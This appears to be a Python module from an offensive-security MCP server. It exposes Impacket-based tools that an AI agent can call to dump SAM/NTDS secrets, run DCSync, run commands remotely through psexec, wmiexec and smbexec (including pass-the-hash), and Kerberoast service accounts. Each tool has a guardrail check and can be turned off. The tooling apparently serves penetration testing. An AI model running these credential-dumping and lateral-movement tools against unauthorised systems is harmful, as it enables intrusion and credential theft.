# cstrike/mcp_server/tools/impacket.py — Impacket lateral movement & credential tools

import asyncio
import json
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from modules.utils import run_command_with_log, save_result, get_target_dir


def register(mcp, guardrails):

    def _build_auth(domain, username, password, hashes, target):
        """Build DOMAIN/USER:PASS@TARGET or DOMAIN/USER@TARGET -hashes LM:NT."""
        user_part = f"{domain}/{username}" if domain else username
        if hashes:
            return [f"{user_part}@{target}", "-hashes", hashes]
        return [f"{user_part}:{password}@{target}"]

    @mcp.tool()
    async def impacket_secretsdump(target: str, domain: str = "",
                                   username: str = "", password: str = "",
                                   hashes: str = "",
                                   just_dc: bool = False) -> str:
        """Dump SAM/NTDS secrets from a Windows host using impacket-secretsdump.
        Requires valid credentials or NTLM hash. hashes format: LM:NT.
        just_dc=true targets only NTDS.dit (DCSync)."""
        guardrails.enforce("impacket-secretsdump", target)
        if not guardrails.check_exploitation_allowed():
            return json.dumps({"error": "Exploitation is disabled in config."})

        cmd = ["impacket-secretsdump"]
        cmd.extend(_build_auth(domain, username, password, hashes, target))
        if just_dc:
            cmd.append("-just-dc")

        output = await asyncio.to_thread(
            run_command_with_log, cmd, guardrails.get_timeout())
        save_result(target, "impacket_secretsdump", cmd, output)
        return json.dumps({"tool": "impacket-secretsdump", "target": target,
                           "output": output})

    @mcp.tool()
    async def impacket_psexec(target: str, domain: str = "",
                              username: str = "", password: str = "",
                              command: str = "cmd.exe",
                              hashes: str = "") -> str:
        """Execute commands on a remote Windows host via SMB service creation
        (PsExec-style). Writes a service binary to ADMIN$."""
        guardrails.enforce("impacket-psexec", target)
        if not guardrails.check_exploitation_allowed():
            return json.dumps({"error": "Exploitation is disabled in config."})

        cmd = ["impacket-psexec"]
        cmd.extend(_build_auth(domain, username, password, hashes, target))
        if command != "cmd.exe":
            cmd.extend(["-c", command])

        output = await asyncio.to_thread(
            run_command_with_log, cmd, guardrails.get_timeout())
        save_result(target, "impacket_psexec", cmd, output)
        return json.dumps({"tool": "impacket-psexec", "target": target,
                           "output": output})

    @mcp.tool()
    async def impacket_wmiexec(target: str, domain: str = "",
                               username: str = "", password: str = "",
                               command: str = "whoami",
                               hashes: str = "") -> str:
        """Execute commands on a remote Windows host via WMI. Stealthier than
        psexec — no service binary written to disk."""
        guardrails.enforce("impacket-wmiexec", target)
        if not guardrails.check_exploitation_allowed():
            return json.dumps({"error": "Exploitation is disabled in config."})

        cmd = ["impacket-wmiexec"]
        cmd.extend(_build_auth(domain, username, password, hashes, target))
        cmd.append(command)

        output = await asyncio.to_thread(
            run_command_with_log, cmd, guardrails.get_timeout())
        save_result(target, "impacket_wmiexec", cmd, output)
        return json.dumps({"tool": "impacket-wmiexec", "target": target,
                           "output": output})

    @mcp.tool()
    async def impacket_smbexec(target: str, domain: str = "",
                               username: str = "", password: str = "",
                               command: str = "whoami",
                               hashes: str = "") -> str:
        """Execute commands via SMB without writing a binary to disk. Uses
        native Windows commands through a temporary service."""
        guardrails.enforce("impacket-smbexec", target)
        if not guardrails.check_exploitation_allowed():
            return json.dumps({"error": "Exploitation is disabled in config."})

        cmd = ["impacket-smbexec"]
        cmd.extend(_build_auth(domain, username, password, hashes, target))
        cmd.append(command)

        output = await asyncio.to_thread(
            run_command_with_log, cmd, guardrails.get_timeout())
        save_result(target, "impacket_smbexec", cmd, output)
        return json.dumps({"tool": "impacket-smbexec", "target": target,
                           "output": output})

    @mcp.tool()
    async def impacket_kerberoast(target: str, domain: str = "",
                                  username: str = "",
                                  password: str = "") -> str:
        """Request TGS tickets for service accounts (Kerberoasting) using
        impacket-GetUserSPNs. Returns crackable hashes for offline attack."""
        guardrails.enforce("impacket-GetUserSPNs", target)
        if not guardrails.check_exploitation_allowed():
            return json.dumps({"error": "Exploitation is disabled in config."})

        user_part = f"{domain}/{username}" if domain else username
        cmd = ["impacket-GetUserSPNs",
               f"{user_part}:{password}@{target}",
               "-request"]

        output = await asyncio.to_thread(
            run_command_with_log, cmd, guardrails.get_timeout())
        save_result(target, "impacket_kerberoast", cmd, output)
        return json.dumps({"tool": "impacket-GetUserSPNs", "target": target,
                           "output": output})
